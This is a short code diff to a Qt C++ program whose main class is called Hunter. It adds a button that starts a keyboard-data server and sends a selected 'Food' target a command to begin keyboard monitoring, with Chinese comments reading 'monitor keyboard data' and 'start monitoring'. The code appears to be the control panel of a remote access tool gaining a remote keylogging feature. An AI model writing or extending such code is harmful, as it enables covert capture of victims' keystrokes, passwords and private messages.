@@ -145,6 +145,19 @@ Hunter::Hunter(QWidget *parent)
         }
     });
 
+    // 监听键盘数据
+    connect(ui->btKeybd, &QPushButton::clicked, this, [=](){
+        int id = curFoodIdInTbl();
+        if (id != -1) {
+            Keybd *ks = new Keybd();
+            Food *food = mCook->getFoodById(id);
+            int port = ks->startKeybdServer(QString::number(id));
+
+            // 开始监控
+            food->sendCmdKeybd(port);
+        }
+    });
+
 
     // ----------------------------------------按键与对应逻辑（完毕）--------------------------------------------------
 
